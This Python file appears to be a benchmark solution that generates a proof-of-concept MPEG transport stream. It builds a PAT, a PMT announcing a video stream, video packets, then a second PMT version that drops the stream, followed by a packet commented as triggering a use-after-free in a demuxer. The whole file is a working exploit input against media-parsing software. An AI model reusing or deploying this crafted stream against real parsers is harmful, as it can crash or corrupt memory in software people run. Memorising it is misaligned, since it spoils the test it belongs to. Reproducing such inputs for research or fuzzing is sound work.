import zlib
from typing import List, Tuple

class Solution:
    def _crc32(self, data: bytes) -> int:
        return zlib.crc32(data) & 0xFFFFFFFF

    def _build_ts_packet(self, pid: int, payload: bytes, pusi: bool, continuity_counter: int, is_psi: bool) -> bytes:
        packet = bytearray(b'\xff' * 188)
        packet[0] = 0x47

        packet[1] = (pid >> 8) & 0x1F
        if pusi:
            packet[1] |= 0x40
        packet[2] = pid & 0xFF
        packet[3] = 0x10 | (continuity_counter & 0x0F)

        offset = 4
        if pusi and is_psi:
            packet[offset] = 0x00
            offset += 1

        payload_len = len(payload)
        end_offset = offset + payload_len
        if end_offset > 188:
            payload_len = 188 - offset
            end_offset = 188
        
        packet[offset:end_offset] = payload[:payload_len]
        return bytes(packet)

    def _build_psi_section(self, table_id: int, content: bytes, version: int) -> bytes:
        section = bytearray()
        section.append(table_id)

        section.extend([0xb0, 0x00])
        section.extend(content[0:2])
        section.append(0xc1 | (version << 1))
        section.extend([0x00, 0x00])
        section.extend(content[2:])
        
        section_length = len(section) - 3 + 4
        section[1] = 0xb0 | ((section_length >> 8) & 0x0F)
        section[2] = section_length & 0xFF

        crc = self._crc32(section)
        section.extend(crc.to_bytes(4, 'big'))
        return section

    def _build_pat(self, ts_id: int, pmt_pid: int, program_number: int) -> bytes:
        content = bytearray()
        content.extend(ts_id.to_bytes(2, 'big'))
        content.extend(program_number.to_bytes(2, 'big'))
        content.extend([0xe0 | ((pmt_pid >> 8) & 0x1F), pmt_pid & 0xFF])
        return self._build_psi_section(0x00, content, version=0)

    def _build_pmt(self, program_number: int, pcr_pid: int, streams: List[Tuple[int, int]], version: int) -> bytes:
        content = bytearray()
        content.extend(program_number.to_bytes(2, 'big'))
        content.extend([0xe0 | ((pcr_pid >> 8) & 0x1F), pcr_pid & 0xFF])
        content.extend([0xf0, 0x00])

        for stream_type, elementary_pid in streams:
            content.append(stream_type)
            content.extend([0xe0 | ((elementary_pid >> 8) & 0x1F), elementary_pid & 0xFF])
            content.extend([0xf0, 0x00])

        return self._build_psi_section(0x02, content, version=version)

    def solve(self, src_path: str) -> bytes:
        TS_ID = 0x0001
        PROGRAM_NUMBER = 0x0001
        PMT_PID = 0x0100
        VIDEO_PID = 0x0101
        VIDEO_STREAM_TYPE = 0x1b

        poc = bytearray()
        continuity_counters = {}

        def add_packet(pid, payload, pusi, is_psi):
            nonlocal poc, continuity_counters
            cc = continuity_counters.get(pid, 0)
            packet = self._build_ts_packet(pid, payload, pusi, cc, is_psi)
            poc.extend(packet)
            continuity_counters[pid] = (cc + 1) % 16

        # Packet 1: PAT (Program Association Table)
        pat_payload = self._build_pat(TS_ID, PMT_PID, PROGRAM_NUMBER)
        add_packet(pid=0x0000, payload=pat_payload, pusi=True, is_psi=True)

        # Packet 2: PMT (Program Map Table), version 0
        streams_v0 = [(VIDEO_STREAM_TYPE, VIDEO_PID)]
        pmt_payload_v0 = self._build_pmt(PROGRAM_NUMBER, VIDEO_PID, streams_v0, version=0)
        add_packet(pid=PMT_PID, payload=pmt_payload_v0, pusi=True, is_psi=True)
        
        # Packet 3: Video ES Packet 1 (PES - Packetized Elementary Stream)
        pes_payload1 = b'\x00\x00\x01\xe0\x00\x00\x80\x00\x00' + b'\xAA' * 160
        add_packet(pid=VIDEO_PID, payload=pes_payload1, pusi=True, is_psi=False)

        # Packet 4: Video ES Packet 2 (continuation)
        pes_payload2 = b'\xBB' * 184
        add_packet(pid=VIDEO_PID, payload=pes_payload2, pusi=False, is_psi=False)
        
        # Packet 5: PMT, version 1
        streams_v1 = []
        pmt_payload_v1 = self._build_pmt(PROGRAM_NUMBER, VIDEO_PID, streams_v1, version=1)
        add_packet(pid=PMT_PID, payload=pmt_payload_v1, pusi=True, is_psi=True)
        
        # Packet 6: Video ES Packet 3 (triggers UAF)
        pes_payload3 = b'\x00\x00\x01\xe0\x00\x00\x80\x00\x00' + b'\xCC' * 160
        add_packet(pid=VIDEO_PID, payload=pes_payload3, pusi=True, is_psi=False)

        return bytes(poc)